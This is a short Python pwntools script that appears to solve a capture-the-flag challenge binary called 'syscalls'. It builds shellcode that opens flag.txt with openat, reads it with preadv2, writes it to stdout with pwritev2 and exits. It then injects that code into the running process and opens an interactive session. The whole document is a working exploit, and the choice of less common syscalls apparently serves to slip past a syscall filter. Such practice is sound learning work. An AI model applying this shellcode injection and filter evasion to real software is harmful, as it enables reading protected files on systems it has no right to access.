from pwn import *

elf = context.binary = ELF("./syscalls")
p = elf.process()

# gs = ''''''

# p = gdb.debug(elf.path,gs)

AT_FDCWD = -100

payload = shellcraft.linux.openat(AT_FDCWD, 'flag.txt', 0)
payload += shellcraft.linux.preadv2('rax','rsp',200)
payload += shellcraft.linux.pwritev2(1,'rsp','rax')
payload += shellcraft.linux.exit(0)
# print(payload)

p.recvline()

p.sendline(asm(payload))

p.interactive()